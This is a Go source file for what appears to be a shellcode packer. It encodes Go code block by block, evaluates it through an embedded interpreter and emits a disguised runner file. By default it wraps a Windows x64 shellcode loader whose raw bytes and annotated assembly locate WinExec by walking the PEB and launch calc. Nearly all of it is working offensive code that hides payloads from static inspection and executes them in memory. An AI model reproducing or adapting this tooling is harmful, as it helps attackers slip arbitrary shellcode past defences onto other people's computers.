package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	cr "crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"strings"
	"text/template"
	"time"

	"github.com/cosmos72/gomacro/fast"
)

const sepFinal = "#@!!@#"

func logandForget(e error) {
	fmt.Println("error:\t", e)
}

func NewEncryptionKey() []byte {
	key := [32]byte{}
	_, err := io.ReadFull(cr.Reader, key[:])
	if err != nil {
		panic(err)
	}
	return key[:]
}
func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

// Encrypt encrypts data using 256-bit AES-GCM.  This both hides the content of
// the data and provides a check that it hasn't been altered. Output takes the
// form nonce|ciphertext|tag where '|' indicates concatenation.
func encrypt(data []byte, passphrase string) []byte {
	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext
}
func decrypt(data []byte, passphrase string) []byte {
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

var fl = flag.String("f", "", "Run this go file")
var dbg = flag.Bool("g", false, "debug file while running")
var output = flag.String("o", "crypt_out"+fmt.Sprint(time.Now().Local().Unix())+".go", "Select name of the output file")

func init() {
	flag.Parse()
}

// func tob64(v []byte) string {
// 	return base64.RawURLEncoding.EncodeToString(v)
// }
// func enc(text, newkey, key []byte, sep string) []byte {
// 	text = append(text, []byte(sep)...)
// 	e, err := Encrypt(append(text, []byte(tob64(newkey))...), key)
// 	if err != nil {
// 		fmt.Println(err)
// 	}
// 	return e
// }

func finalSplit(d string, sep string) []string {
	return strings.Split(d, sep)
}

func fromb64(v string) []byte {
	tmp, err1 := base64.RawURLEncoding.Strict().DecodeString(v)
	logandForget(err1)
	return tmp
}

// func fromb64(v string) []byte {
// 	tmp, err := base64.RawURLEncoding.Strict().DecodeString(v)
// 	logandForget(err)
// 	return tmp
// }
// func dec(text []byte, key []byte) ([]byte, []byte) {
// 	d, err := Decrypt(text, key)
// 	if err != nil {
// 		if len(d) == 0 {
// 			return []byte("finish(); // owned"), NewEncryptionKey()
// 		} else {
// 			// fmt.Println(err)
// 		}
// 	}
// 	return d, []byte(strings.Split(string(d), " // ")[1])
// }
func finalJoin(enc []string, key []byte, sep string) string {
	// fmt.Println("x0r4")
	enc = append(enc, tob64(key))
	// fmt.Println(string(bytes.Join(enc, []byte(sep))))
	return strings.Join(enc, sep)
}
func tob64(v []byte) string {
	return base64.RawURLEncoding.EncodeToString(v)
}
func enc(text string) string {
	// text = append(text, []byte(sep)...)
	// text = append(text, []byte(tob64(newkey))...)
	// e := encrypt(text, string(key))
	// e, err := Encrypt(append(text, []byte(tob64(newkey))...), key)
	// if err != nil {
	// 	fmt.Println(err)
	// }
	// return tob64(e)
	return tob64([]byte(text))
}

// func fromb64(v string) []byte {
// 	tmp, err2 := base64.RawURLEncoding.Strict().DecodeString(v)
// 	logandForget(err2)
// 	return tmp
// }
func dec(text string) string {
	return string(fromb64(text))
	// d := fromb64(text)
	// d2 := string(d)
	// // d, err := Decrypt(fromb64(text), key)
	// // if err != nil {
	// // 	if len(d) == 0 {
	// // 		return "", ""
	// // 	} else {
	// // 		fmt.Println(err)
	// // 	}
	// // }
	// // fmt.Println(strings.Split(string(d), " // ")[1])
	// if len(strings.Split(d2, " // ")) > 1 {
	// 	return d2, strings.Split(d2, " // ")[1][:len(strings.Split(d2, " // ")[1])-1]
	// }
	// return d2, ""
}
func dexec(code string) {
	encoded2 := strings.Split(code, "|")
	// k2 := fromb64(encoded2[len(encoded2)-1])
	// encoded2 = encoded2
	fmt.Println("exec")
	interp := fast.New()
	for _, v := range encoded2 {
		d := dec(v)
		fmt.Println(d)
		fmt.Println(interp.Eval(d))
		// k2 = fromb64(k)
	}
}

func blockSplit(code string) []string {
	at_block := 0
	line := ""
	lines := []string{}
	for _, c := range strings.Split(code, "") {
		line += c
		if c == "{" || c == "(" {
			at_block += 1
		}
		if c == "}" || c == ")" {
			at_block -= 1
		}
		if c == "\n" && at_block == 0 {
			lines = append(lines, line)
			line = ""
		}
	}
	if line != "" {
		lines = append(lines, line)
	}
	return lines
}

// func finalJoin(enc [][]byte, key []byte, sep string) []byte {
// 	// fmt.Println("x0r4")
// 	enc = append(enc, key)
// 	// fmt.Println(string(bytes.Join(enc, []byte(sep))))
// 	return bytes.Join(enc, []byte(sep))
// }

func test() {
	fmt.Println("compiled test")
}

func main() {
	inp := `//package main

import (
	// "io/ioutil"
	// "os"
	// "syscall"
	// "unsafe"
	"github.com/jax777/shellcode-launch/winshellcode"
)

// const (
// 	MEM_COMMIT             = 0x1000
// 	MEM_RESERVE            = 0x2000
// 	PAGE_EXECUTE_READWRITE = 0x40
// )

var (
	// kernel32       = syscall.MustLoadDLL("kernel32.dll")
	// ntdll          = syscall.MustLoadDLL("ntdll.dll")
	// VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	// RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
	shellcode_calc = []byte{ /*
			bits 64
			section .text
			global shellcode
			shellcode:
				; x64 WinExec *requires* 16 byte stack alignment and four QWORDS of stack space, which may be overwritten.
				; http://msdn.microsoft.com/en-us/library/ms235286.aspx
				push rax
				push rcx
				push rdx
				push rbx
				push rsi
				push rdi
				push rbp
				push 0x60                                       ; Stack is now 16 bit aligned
				pop rdx                                         ; RDX = 0x60
				push 'calc'
				push rsp
				pop rcx                                         ; RCX = &("calc")
				sub rsp, 0x28                                    ; Stack was 16 byte aligned already and there are >4 QWORDS on the stack.
				mov rsi, [gs:rdx]                               ; RSI = [TEB + 0x60] = &PEB
				mov rsi, [rsi + 0x18]                           ; RSI = [PEB + 0x18] = PEB_LDR_DATA
				mov rsi, [rsi + 0x10]                           ; RSI = [PEB_LDR_DATA + 0x10] = LDR_MODULE InLoadOrder[0] (process)
				lodsq                                           ; RAX = InLoadOrder[1] (ntdll)
				mov rsi, [rax]                                  ; RSI = InLoadOrder[2] (kernel32)
				mov rdi, [rsi + 0x30]                           ; RDI = [InLoadOrder[2] + 0x30] = kernel32 DllBase
				; Found kernel32 base address (RDI)
				add edx, dword [rdi + 0x3c]                     ; RBX = 0x60 + [kernel32 + 0x3C] = offset(PE header) + 0x60
				; PE header (RDI+RDX-0x60) = @0x00 0x04 byte signature
				;                            @0x04 0x18 byte COFF header
				;                            @0x18      PE32 optional header (= RDI + RDX - 0x60 + 0x18)
				mov ebx, dword [rdi + rdx - 0x60 + 0x18 + 0x70] ; RBX = [PE32+ optional header + offset(PE32+ export table offset)] = offset(export table)
				; Export table (RDI+EBX) = @0x20 Name Pointer RVA
				mov esi, dword [rdi + rbx + 0x20]               ; RSI = [kernel32 + offset(export table) + 0x20] = offset(names table)
				add rsi, rdi                                    ; RSI = kernel32 + offset(names table) = &(names table)
				; Found export names table (RSI)
				mov edx, dword [rdi + rbx + 0x24]               ; EDX = [kernel32 + offset(export table) + 0x24] = offset(ordinals table)
				; Found export ordinals table (RDX)
			find_winexec_x64:                                   ; speculatively load ordinal (RBP)
				movzx ebp, word [rdi + rdx]                     ; RBP = [kernel32 + offset(ordinals table) + offset] = function ordinal
				lea edx, [rdx + 2]                              ; RDX = offset += 2 (will wrap if > 4Gb, but this should never happen)
				lodsd                                           ; RAX = &(names table[function number]) = offset(function name)
				cmp dword [rdi + rax], 'WinE'                   ; *(DWORD*)(function name) == "WinE" ?
				jne find_winexec_x64
				mov esi, dword [rdi + rbx + 0x1c]               ; RSI = [kernel32 + offset(export table) + 0x1C] = offset(address table)
				add rsi, rdi                                    ; RSI = kernel32 + offset(address table) = &(address table)
				mov esi, [rsi + rbp * 4]                        ; RSI = &(address table)[WinExec ordinal] = offset(WinExec)
				add rdi, rsi                                    ; RDI = kernel32 + offset(WinExec) = WinExec
			; Found WinExec (RDI)
				cdq                                             ; RDX = 0 (assuming EAX < 0x80000000, which should always be true)
				call rdi                                        ; WinExec(&("calc"), 0);
				add rsp, 0x30                                   ; reset stack to where it was after pushing registers
				pop rbp                                         ; pop all the items off the stack that we pushed on earlier
				pop rdi
				pop rsi
				pop rbx
				pop rdx
				pop rcx
				pop rax
				retn
		*/

		// nasm -DFUNC=TRUE -DCLEAN=TRUE -DSTACK_ALIGN=TRUE w64-exec-calc-shellcode.asm

		0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
		0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
		0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
		0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
		0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
		0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
		0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
	}
)

// func checkErr(err error) {
// 	if err != nil {
// 		if err.Error() != "The operation completed successfully." {
// 			println(err.Error())
// 			os.Exit(1)
// 		}
// 	}
// }

func main() {
	// shellcode := shellcode_calc
	winshellcode.Run(shellcode_calc)
	// if len(os.Args) > 1 {
	// 	shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
	// 	checkErr(err)
	// 	shellcode = shellcodeFileData
	// }

	// addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	// if addr == 0 {
	// 	checkErr(err)
	// }
	// _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	// checkErr(err)
	// syscall.Syscall(addr, 0, 0, 0, 0)
}

main()
`
	if *fl != "" {
		i, err := ioutil.ReadFile(*fl)
		if err != nil {
			panic(err)
		}
		inp = string(i)
	}
	encoded := []string{}
	// key := NewEncryptionKey()
	// lines := strings.Split(inp, "\n")
	lines := blockSplit(inp)
	// k := key
	buf := ""
	// defer func() {
	// 	if r := recover(); r != nil {
	// 		fmt.Printf("Recovering from panic in main error is: %v \n", r)
	// 	}
	// }()
	interp := fast.New()
	// interp.ImportPackage("os", "os")
	// ex, err := os.Executable()
	// if err != nil {
	// 	panic(err)
	// }
	// exPath := filepath.Dir(ex)
	// interp.ImportPackage("hook", "github.com/cauefcr/ghook")
	for _, l := range lines {
		// if l == "" {
		// 	continue
		// }
		buf += l + "\n"
		// ok := make(chan bool, 3)
		// val := make(chan interface{}, 3)
		// go func(ok chan bool, out chan interface{}) {
		// 	defer func() {
		// 		if r := recover(); r != nil {
		// 			ok <- false
		// 		}
		// 	}()
		fmt.Println(interp.Eval(buf))
		// 	if err != nil {
		// 		fmt.Println(err)
		// 		ok <- false
		// 	} else {
		// 		ok <- true
		// 		out <- val
		// 	}
		// }(ok, val)
		// runs := <-ok
		// if err != nil {
		// fmt.Println("oops", buf)
		// 	continue
		// }
		// nk := NewEncryptionKey()
		// if *dbg {
		// 	fmt.Println("line: ", l, l+" // "+string(tob64(nk)))
		// }
		// e := []byte(buf[:len(buf)-1])
		e := enc(buf[:len(buf)-1])
		// fmt.Println(string(e))
		encoded = append(encoded, e)
		g := dec(e)
		if *dbg {
			fmt.Println("E > ", string(g))
			// if string(nk1) != string(tob64(nk)) {
			// 	fmt.Println(string(g))
			// 	fmt.Println("nk: \t", string(tob64(nk)))
			// }
			// ip := fast.New()
			// fmt.Println(ip.Eval(string(g)))
			// fmt.Println(ip.Eval(string(g)))
		}
		// k = nk
		// fmt.Println(buf)
		buf = ""
	}
	if buf != "" {
		e := enc(buf[:len(buf)-1])
		encoded = append(encoded, e)
	}
	// fmt.Println(string(e))

	// fmt.Println("buf at end: ", buf)
	// encoded = append(encoded, tob64(key))
	final := strings.Join(encoded, "|")
	encoded2 := strings.Split(final, "|")
	// k2 := fromb64(encoded2[len(encoded2)-1])
	// encoded2 = encoded2
	fmt.Println("exec")
	interp = fast.New()
	for _, v := range encoded2 {
		d := dec(v)
		fmt.Println(d)
		fmt.Println(interp.Eval(d))
		// k2 = fromb64(k)
	}
	// final := finalJoin(encoded, key, sepFinal)
	// fmt.Println(string(fromb64(final)))

	if output != nil && *output != "" {
		// b, err := ioutil.ReadFile("run.go")
		// t := template.New("action")
		// t, err := t.ParseFiles("run.go")
		t := template.Must(template.ParseFiles("run.go"))
		os.Remove(*output)
		// key := "some strings"

		data := struct {
			Key string
			LT  string
		}{
			Key: final,
			LT:  "<",
		}
		var tpl bytes.Buffer
		if err := t.Execute(&tpl, data); err != nil {
			// return err
			panic(err)
		}

		// result := tpl.String()

		ioutil.WriteFile(*output, tpl.Bytes(), 0777)
	}
	if *dbg {
		dexec(final)
	}
}
